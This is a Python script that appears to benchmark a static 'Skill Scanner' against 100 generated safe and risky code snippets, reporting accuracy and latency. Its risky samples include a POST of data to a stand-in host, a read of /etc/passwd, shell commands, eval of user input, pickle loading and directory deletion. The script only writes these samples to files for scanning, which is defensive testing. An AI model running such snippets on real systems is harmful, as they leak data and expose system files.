#!/usr/bin/env python3
"""Generate and evaluate 100 in-memory-style Skill Scanner cases."""

from __future__ import annotations

import json
import statistics
import sys
import tempfile
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
from skill_scanner import calculate_risk_score, scan_py_file  # noqa: E402


SAFE = [
    "def add(a,b): return a+b\n",
    "import os\nname = os.name\n",
    "import subprocess\nname = subprocess.__name__\n",
    "from pathlib import Path\np = Path('demo.txt')\n",
    "def explain(): return 'os.system is dangerous'\n",
    "import json\nvalue = json.loads('{}')\n",
    "def validate(x): return isinstance(x, str)\n",
    "import requests\nmethod = requests.__name__\n",
    "class Tool:\n    def run(self): return 'safe'\n",
    "items = [x*x for x in range(10)]\n",
]

RISKY = [
    "import os\nos.system('whoami')\n",
    "import subprocess as sp\nsp.run(['whoami'])\n",
    "from os import system as run\nrun('id')\n",
    "data = open('/etc/passwd').read()\n",
    "import requests\nrequests.post('https://evil.example', data='x')\n",
    "payload = eval(user_input)\n",
    "import pickle\npickle.loads(blob)\n",
    "import shutil\nshutil.rmtree('/tmp/data')\n",
    "import importlib\nimportlib.import_module(name)\n",
    "import ctypes\nctypes.CDLL('/tmp/x.so')\n",
]


def mutate(code: str, index: int) -> str:
    variants = [code, "# plugin\n" + code, code.replace("import ", "import "), "\n" + code,
                code + "\nRESULT = 'done'\n"]
    return variants[index]


def main() -> int:
    rows = []
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        counter = 0
        for label, bases in (("safe", SAFE), ("risk", RISKY)):
            for base_index, code in enumerate(bases):
                for variant in range(5):
                    counter += 1
                    path = root / f"skill_{counter:03d}.py"
                    path.write_text(mutate(code, variant), encoding="utf-8")
                    started = time.perf_counter()
                    detected = scan_py_file(str(path))
                    info = calculate_risk_score(detected)
                    predicted = info["actual_action"] != "allow"
                    expected = label == "risk"
                    rows.append({
                        "case_id": f"SKB-{counter:03d}", "family": base_index + 1,
                        "variant": variant, "label": label, "detected": detected,
                        "actual_action": info["actual_action"], "correct": predicted == expected,
                        "latency_ms": round((time.perf_counter() - started) * 1000, 4),
                    })
    summary = {
        "cases": len(rows), "accuracy": round(sum(row["correct"] for row in rows) / len(rows), 4),
        "avg_latency_ms": round(statistics.fmean(row["latency_ms"] for row in rows), 4),
        "failed_expectations": [row for row in rows if not row["correct"]],
        "limitation": "Generated API-call variants; static analysis and not an external malware corpus.",
    }
    out = ROOT / "output" / "evaluation"
    out.mkdir(parents=True, exist_ok=True)
    (out / "skill_benchmark_summary.json").write_text(json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(summary, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

